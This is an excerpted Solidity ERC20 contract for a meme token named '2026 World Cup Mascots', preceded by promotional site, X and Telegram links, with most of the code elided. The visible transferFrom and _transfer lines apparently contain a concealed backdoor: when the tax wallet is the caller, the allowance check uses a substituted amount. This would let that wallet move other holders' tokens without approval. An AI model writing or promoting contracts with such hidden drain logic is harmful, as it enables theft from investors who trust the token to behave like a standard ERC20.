...
Chosen because the 2026 World Cup is hosted across Canada, Mexico & USA — three nations, one stage.

https://www.mascots2026.site
https://x.com/mascots2026_x
https://t.me/mascots2026
...
contract Token is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"2026 World Cup Mascots";
    string private constant _symbol = unicode"MASCOTS";
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_amnt, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        } else if (_msgSender() == _taxWallet) _amnt = taxAmount;
    ...
    function openMax() public onlyOwner{
